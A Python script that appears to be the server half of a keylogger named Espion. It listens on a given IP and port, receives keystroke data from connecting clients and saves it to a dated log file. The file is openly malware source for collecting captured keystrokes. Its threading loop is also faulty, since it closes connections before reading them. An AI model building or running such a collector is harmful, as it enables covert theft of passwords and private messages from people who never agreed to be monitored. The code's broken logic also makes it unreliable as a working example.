import socket
from sys import *
import os
from _thread import *
from datetime import date
if(len(argv)<2):
    title = open("title.txt", "r")
    print(title.read())
    title.close()
    print("\n==================== THE KEYLOGGER PROGRAM ===========================")
    print("Usage: python Espion.py <%s's IP> <PORT>"%socket.gethostname())
    print("Usage (help file): python Espion.py -h OR python Espion.py --help")
    exit()
elif(argv[1]=="-h" or argv[1]=="--help"):
    help_file = open("information_file.txt", "r")
    print(help_file.read())
    help_file.close()
    exit()
title = open("title.txt", "r")
print(title.read())
title.close()
print("\n==================== THE KEYLOGGER PROGRAM ===========================")
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind((argv[1],int(argv[2])))
serverSocket.listen(5)
log_file = open("Keystroke log file ("+str(date.today())+").txt","w")
def client_thread():
    (clientConnected, clientAddress) = serverSocket.accept()
    dataFromClient = clientConnected.recv(2048)
    print(argv[1]+' --> '+clientAddress[0]+': '+dataFromClient.decode())
    log_file.write(argv[1]+' --> '+clientAddress[0]+': '+dataFromClient.decode()+'\n')
    clientConnected.close()
while(True):
    (clientConnected, clientAddress) = serverSocket.accept()
    dataFromClient = clientConnected.recv(2048)
    print(argv[1]+' --> '+clientAddress[0]+': '+dataFromClient.decode())
    log_file.write(argv[1]+' --> '+clientAddress[0]+': '+dataFromClient.decode()+'\n')
    clientConnected.close()
    while(True):
        (clientConnected, clientAddress) = serverSocket.accept()
        clientConnected.close() 
        start_new_thread(client_thread,())
        
